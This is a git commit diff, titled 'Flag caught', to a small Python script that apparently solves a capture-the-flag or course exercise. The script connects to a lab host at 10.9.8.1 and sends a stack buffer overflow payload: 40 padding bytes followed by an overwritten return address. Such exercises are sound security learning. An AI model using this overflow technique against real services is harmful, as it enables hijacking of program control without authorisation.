c72bfba37fee1517810c8b271655c52a86d1004e
Sindre <sindre.glomnes@gmail.com>
2022-09-11 14:20:37 +0200

    Flag caught

--- exercise2.py
+++ exercise2.py
@@ -1,18 +1,22 @@
 import socket
+import sys
 
-def netcat(content):
+def netcat(hostname, port, content):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(('10.9.8.1', 5009))
+    data = s.recv(1024)
+    print ("initial: ", repr(data))
     s.sendall(content)
     s.shutdown(socket.SHUT_WR)
-    while 1:
-        data = s.recv(1024)
-        if len(data) == 0:
-            break
-        print("Received:", repr(data))
+    data2 = s.recv(1024)
+    print("Received:", repr(data2))
     print("Connection closed.")
-    s.close()
+    
 
-content = b'A' * 39 + b'0x00000000004011ab'
+content1 = b'A' * 40 + b'\x92\x11\x40\x00\x00\x00\x00\x00'
+content = b'Olav'
+hostname = '10.9.8.1'
+port = 5009
 
-netcat(content)
+
+netcat(hostname, port, content1)
